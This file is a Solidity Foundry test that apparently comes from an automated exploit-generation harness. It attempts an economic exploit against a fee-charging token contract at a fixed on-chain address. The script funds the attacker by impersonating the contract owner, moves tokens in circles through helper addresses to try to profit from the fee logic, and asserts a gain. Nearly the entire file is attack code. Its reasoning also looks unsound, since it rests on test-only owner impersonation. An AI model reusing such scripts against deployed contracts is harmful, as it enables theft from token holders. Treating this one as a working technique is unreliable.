// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface honeyToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function _TAX_FEE() external view returns (uint256);
    function _BURN_FEE() external view returns (uint256);
    function _CHARITY_FEE() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);

    // Helper addresses
    address helper1 = address(0x100);
    address helper2 = address(0x200);
    address helper3 = address(0x300);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // We need to get some tokens first
        // The contract is already deployed at TARGET
        // We'll impersonate the owner to get tokens
        address owner = honeyToken(TARGET).owner();
        vm.startPrank(owner);

        // Get initial token balance for attacker
        uint256 initialBalance = honeyToken(TARGET).balanceOf(owner);
        // Transfer some tokens to attacker
        honeyToken(TARGET).transfer(attacker, initialBalance / 10);

        vm.stopPrank();

        // Label for debugging
        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        // Record initial balance
        uint256 initialAttackerBalance = honeyToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // Approve tokens for transferFrom operations
        honeyToken(TARGET).approve(address(this), type(uint256).max);

        // Create a series of transfers between helper addresses and attacker
        // Each transfer will trigger fee calculation including charity fee

        // First, transfer some tokens to helper1
        uint256 transferAmount = initialAttackerBalance / 4;
        honeyToken(TARGET).transfer(helper1, transferAmount);

        // Transfer from helper1 to helper2 (need to impersonate helper1)
        vm.prank(helper1);
        honeyToken(TARGET).approve(address(this), type(uint256).max);

        vm.prank(helper1);
        honeyToken(TARGET).transfer(helper2, transferAmount / 2);

        // Transfer from helper2 to helper3
        vm.prank(helper2);
        honeyToken(TARGET).approve(address(this), type(uint256).max);

        vm.prank(helper2);
        honeyToken(TARGET).transfer(helper3, transferAmount / 4);

        // Transfer from helper3 back to attacker
        vm.prank(helper3);
        honeyToken(TARGET).approve(address(this), type(uint256).max);

        vm.prank(helper3);
        honeyToken(TARGET).transfer(attacker, transferAmount / 8);

        // Do another round of transfers to amplify the effect
        // Transfer from attacker to helper2
        honeyToken(TARGET).transfer(helper2, transferAmount / 10);

        // Transfer from helper2 to helper1
        vm.prank(helper2);
        honeyToken(TARGET).transfer(helper1, transferAmount / 20);

        // Transfer from helper1 back to attacker
        vm.prank(helper1);
        honeyToken(TARGET).transfer(attacker, transferAmount / 40);

        // Check final balance
        uint256 finalAttackerBalance = honeyToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalAttackerBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");
        uint256 finalBalance = IERC20(0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

